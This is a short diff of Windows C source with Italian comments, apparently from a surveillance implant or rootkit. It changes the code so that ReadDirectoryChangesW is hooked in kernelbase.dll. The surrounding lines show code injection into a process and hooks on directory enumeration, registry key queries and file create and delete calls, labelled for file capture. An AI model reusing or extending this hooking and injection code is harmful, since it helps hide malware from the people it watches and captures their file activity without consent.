@@ -364,6 +364,18 @@ void SetupServices(BYTE *raw_data)
 	InjectCode(GetCurrentProcessId(), (BYTE *)IPCClientWrite, 1000, (BYTE *)&write_data, sizeof(write_data), (BYTE **)&(common_setup->ipc_client_write), (BYTE **)&(common_setup->ipc_write_data));
 }
 
+BOOL IsInKernelBase()
+{
+	HMODULE hkernelbase;
+	hkernelbase = GetModuleHandle("kernelbase.dll");
+	if (hkernelbase == NULL)
+		return FALSE;
+	if (GetProcAddress(hkernelbase, "ReadDirectoryChangesW"))
+		return TRUE;
+
+	return FALSE;
+}
+
 // Funzione richiamata dal thread di hooking
 void __stdcall H64_MakeHooking(void)
 {
@@ -376,8 +388,13 @@ void __stdcall H64_MakeHooking(void)
 	MAKE_HOOK("NtQueryDirectoryFile", "ntdll.dll", H_NtQueryDirectoryFile, 11, CommonSetup); 
 	MAKE_HOOK("NtEnumerateValueKey", "ntdll.dll", H_NtEnumerateValueKey, 6, CommonSetup); 
 	MAKE_HOOK("NtQueryKey", "ntdll.dll", H_NtQueryKey, 5, CommonSetup); 
-	MAKE_HOOK("ReadDirectoryChangesW", "kernel32.dll", H_ReadDirectoryChangesW, 8, CommonSetup); 
-	
+
+	// Se esiste quella in kernelbase deve hookarla, perche' quella in kernel32 e' solo un wrapper
+	if (IsInKernelBase())
+		MAKE_HOOK("ReadDirectoryChangesW", "kernelbase.dll", H_ReadDirectoryChangesW, 8, CommonSetup); 
+	else
+		MAKE_HOOK("ReadDirectoryChangesW", "kernel32.dll", H_ReadDirectoryChangesW, 8, CommonSetup); 
+
 	// FileOpen e FileCapture
 	MAKE_HOOK("CreateFileW", "kernelbase.dll", H_CreateFileW, 7, CommonSetup); 
 	MAKE_HOOK("DeleteFileW", "kernelbase.dll", H_DeleteFileW, 1, CommonSetup); 
